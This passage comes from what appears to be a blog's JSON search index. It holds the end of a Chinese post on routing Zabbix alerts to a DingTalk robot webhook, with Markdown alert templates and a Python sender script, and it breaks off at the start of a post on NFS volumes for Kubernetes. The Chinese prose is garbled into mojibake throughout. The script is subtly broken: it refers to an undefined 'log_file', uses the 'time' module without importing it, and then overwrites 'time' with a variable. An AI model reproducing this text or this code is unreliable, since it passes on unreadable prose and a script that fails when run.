¹æ®è‡ªå·±éœ€æ±‚æ¥ä¿®æ”¹ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬é…ç½®Zabbixçš„å‘Šè­¦é…ç½®\nåˆ›å»ºæ–°çš„å‘Šè­¦åª’ä»‹ï¼šåª’ä»‹ç±»å‹é€‰æ‹©è„šæœ¬ï¼Œæå‰å°†ä¸Šæ–¹çš„è„šæœ¬æ”¾ç½®äº/usr/lib/zabbix/alertscriptsä¸­å¹¶åœ¨è„šæœ¬åç§°å¤„å¡«å†™ä½ å‘½åçš„æ–‡ä»¶åã€‚ æ·»åŠ å‘Šè­¦å‚æ•°ï¼šè¿™é‡Œç”¨åˆ°äº†3ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯{ALERT.SENDTO}å‘Šè­¦å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯{ALERT.SUBJECT}å‘Šè­¦å¯¹è±¡ï¼Œç¬¬ä¸‰ä¸ªæ˜¯{ALERT.MESSAGE}å‘Šè­¦æ­£æ–‡ï¼ŒæŒ‰ç…§å¡«å†™å³å¯ã€‚\nALERT.SENDTO}\n#å¯¹åº”Pythonè„šæœ¬ä¸­çš„ï¼Œuser=sys.argv1ã€‚\n{ALERT.SUBJECT}\n#å‘é€çš„ä¿¡æ¯çš„æ ‡é¢˜\n{ALERT.MESSAGE}\n#å¯¹åº”Pythonè„šæœ¬ä¸­çš„ï¼Œtext=sys.argv3ã€‚\nå¢åŠ Message typeï¼šä¸€èˆ¬å¢åŠ 3ä¸ªå°±è¶³å¤Ÿäº†ï¼Œå‘ç°é—®é¢˜ã€é—®é¢˜æ¢å¤ã€é—®é¢˜æ›´æ–°ï¼Œè¯¦ç»†çš„è®¾ç½®åœ¨ä¸‹æ–¹è¯´æ˜ã€‚\nè¿™é‡Œå°±æ˜¯å…³é”®äº†ï¼š\nå‘ç°é—®é¢˜çš„æ¨¡æ¿ï¼š\n![å‘Šè­¦å¹³å°ä¿¡æ¯](http://www.rendoumi.com/fire.png)\r\u0026gt; * ##### å‘Šè­¦ä¸»æœº: {HOSTNAME1}\r\u0026gt; * ##### å‘Šè­¦æ—¶é—´: {EVENT.DATE} {EVENT.TIME}\r\u0026gt; * ##### å‘Šè­¦ç­‰çº§: {TRIGGER.SEVERITY}\r\u0026gt; * ##### å‘Šè­¦ä¿¡æ¯: {TRIGGER.NAME}\r\u0026gt; * ##### å‘Šè­¦é¡¹ç›®: {TRIGGER.KEY1}\r\u0026gt; * ##### é—®é¢˜è¯¦æƒ…: {ITEM.NAME}:{ITEM.VALUE}\r\u0026gt; * ##### å½“å‰çŠ¶æ€: {TRIGGER.STATUS}:{ITEM.VALUE1}\r\u0026gt; * ##### äº‹ä»¶ID: {EVENT.ID} Problem recovery(é—®é¢˜æ¢å¤)çš„æ¨¡æ¿ï¼š\n![å‘Šè­¦å¹³å°ä¿¡æ¯](http://www.rendoumi.com/recover.png)\r\u0026gt; * #### è­¦å‘Šè§£é™¤ï¼š{EVENT.RECOVERY.DATE} {EVENT.RECOVERY.TIME}\r\u0026gt; * ##### å‘Šè­¦æŒç»­æ—¶é•¿: {EVENT.DURATION}\r\u0026gt; * ##### å‘Šè­¦ä¸»æœº: {HOST.NAME}\r\u0026gt; * ##### å‘Šè­¦ä¿¡æ¯: {EVENT.NAME}\r\u0026gt; * ##### å‘Šè­¦ç­‰çº§: {EVENT.SEVERITY}\r\u0026gt; * ##### äº‹ä»¶ID: {EVENT.ID}\r\u0026gt; * ##### {TRIGGER.URL} æœ‰è¿™ä¸¤ä¸ªå°±å¤Ÿäº†\nåˆ›å»ºåŠ¨ä½œï¼ˆç‚¹å‡»å·¦è¾¹èœå•çš„é…ç½®\u0026mdash;\u0026gt;åŠ¨ä½œï¼‰\næ·»åŠ å‘Šè­¦æ¡ä»¶\næ·»åŠ  è§¦å‘å™¨ç¤ºè­¦åº¦ å¤§äºç­‰äº è­¦å‘Š\næ“ä½œï¼Œé€‰æ‹©å‘é€ç»™Adminç»„ï¼Œæˆ–è€…å…¶ä»–ç»„ã€‚\nåœ¨æ“ä½œç»†èŠ‚é‡Œï¼Œæˆ‘ä»¬å‘é€å‘Šè­¦åˆ°Adminç»„ï¼Œç„¶åæ–¹å¼é€‰dingdingï¼Œè¿™æ ·å°±è·ŸæŠ¥è­¦åª’ä»‹è”ç³»èµ·æ¥äº†ã€‚\nè¿™æ ·ä¸€è½®è½®çš„æ›´æ–°ä»¥åï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚æ³¨æ„è¦ç ”ç©¶Markdownçš„è¯­æ³•ã€‚å¦å¤–æå‰å‡†å¤‡å¥½å›¾ç‰‡ã€‚\næˆ‘ä»¬å°±å¾—åˆ°ä¸€ä¸ªè·Ÿé˜¿é‡Œäº‘å‘Šè­¦ä¸€æ‘¸ä¸€æ ·çš„ä¸œè¥¿äº†ï¼Œè¯´å®è¯ï¼Œå¥½çœ‹ï¼Œæ²¡æœ‰é¸Ÿç”¨ã€‚\n","permalink":"https://rendoumi.com/posts/20221130-zabbix_dingding/","summary":"\u003cp\u003ezabbix æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®é™…ä¸Šåšä¸»å·²ç»è·³è¿‡äº†è¿™ä¸ªä¸œè¥¿ï¼Œç›´æ¥è¹¦åˆ° Prometheus å»äº†\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œå­˜åœ¨å³åˆç†ï¼Œå½“ä¸‹å…¬å¸ç”¨çš„æ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆç”¨å°±ç”¨å§ï¼Œzabbixå‘åˆ°é’‰é’‰å‘Šè­¦ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿç ”ç©¶ä¸€ä¸‹å¦‚ä½•å‘åˆ°é’‰é’‰å‘Šè­¦ï¼Œè€Œä¸”å¥½çœ‹ä¸€äº›\u003c/p\u003e\n\u003cp\u003eåŸç†ï¼š\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eåŸç†å°±æ˜¯ç”¨ post å‘é’‰é’‰æœºå™¨äººçš„ webhook åœ°å€æäº¤ Markdown çš„ json ä¿¡æ¯\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬è¦å»ºç«‹ä¸ªé’‰é’‰ç¾¤ï¼Œç„¶ååœ¨ç¾¤ä¸­æ·»åŠ ä¸€ä¸ªç¾¤æœºå™¨äººï¼Œè¿™é‡Œå°±ä¼šæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªæœºå™¨äººåªæ¥å—ç‰¹å®šçš„è¯è¯­ï¼ŒäºŒæ˜¯å‘æœºå™¨äººå‘é€æ¶ˆæ¯çš„æœºå™¨çš„ipæ˜¯å›ºå®šçš„ã€‚\u003c/p\u003e\n\u003cp\u003eé˜¿é‡Œäº‘å»ºè®®çš„æ˜¯å…³é”®è¯ï¼š\u003cstrong\u003eäº‘ç›‘æ§ã€äº‘æœåŠ¡ã€ç›‘æ§ã€Monitorã€ECSã€æŠ¥è­¦\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20221130195533865\" loading=\"lazy\" src=\"/posts/20221130-zabbix_dingding/image-20221130195533865.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¿™é‡Œæ›´åŠ å»ºè®®IPï¼ŒIPæ˜¯æ­»çš„ï¼ŒæŠ¥è­¦é‡Œå¸¦å…³é”®è¯æ„å‘³ç€å‘é€å†…å®¹è¢«éƒ¨åˆ†å›ºå®šäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªé’‰é’‰æœºå™¨äººçš„Webhookåœ°å€ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://oapi.dingtalk.com/robot/send?access_token\u003cspan class=\"o\"\u003e=\u003c/span\u003exxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæˆ‘ä»¬è¦å‡†å¤‡ä¸€ä¸ªå‘é€çš„è„šæœ¬ï¼Œpythonå¾ˆåˆé€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/usr/bin/env python\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#coding:utf-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#zabbixé’‰é’‰æŠ¥è­¦\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003edatetime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è¯´æ˜ï¼šè¿™é‡Œæ”¹ä¸ºè‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34;\u003c/span\u003e     \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eisfile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/dingding.log\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elog_file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elog_file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;w+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ejson_text\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;msgtype\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;markdown\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;markdown\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;zabbix monitor\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;at\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;atMobiles\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"n\"\u003euser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"p\"\u003e],\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;isAtAll\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejson_text\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;errcode\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y-%m-\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e %H:%M:%S\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elocaltime\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:æ¶ˆæ¯å‘é€æˆåŠŸ è¿”å›ç :\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:æ¶ˆæ¯å‘é€å¤±è´¥ è¿”å›ç :\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vm\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#ç”¨æˆ·\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#æ ‡é¢˜\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#æ¶ˆæ¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬æŠŠä¸Šé¢çš„æ–‡ä»¶å†…å®¹æ”¾åˆ° /usr/lib/zabbix/alertscripts ç›®å½•ä¸‹ï¼Œåå­—å°±å«åš dingding.py ï¼Œåªèƒ½æ˜¯è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¿™æ˜¯ zabbix ç¼ºçœå¤–æŒ‚è„šæœ¬æ–‡ä»¶çš„ç›®å½•ã€‚\u003c/p\u003e","title":"Zabbixä¸‹å‘å¾€é’‰é’‰å‘Šè­¦"},{"content":"ç”¨NFSæ¥åškubernetesçš„æŒä¹…åŒ–å·è™½ç„¶ä¸æ˜¯æœ€ä½³å®è·µï¼Œä½†å­˜åœ¨å³åˆç†ã€‚åœ¨ç°åœ¨çš„å…¬å¸å°±æ˜¯è¿™ä¹ˆç”¨çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œå¯ç”¨ä½†ä¸æ˜¯æœ€ä½³ã€‚\nä¸€ã€æ­å»ºNFSæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯ #NFSæœåŠ¡ç«¯ (centos7) yum install nfs-utils rpcbind -y mkdir -p /data/nfs/{download,bakup,www} echo \u0026#34;/data/nfs 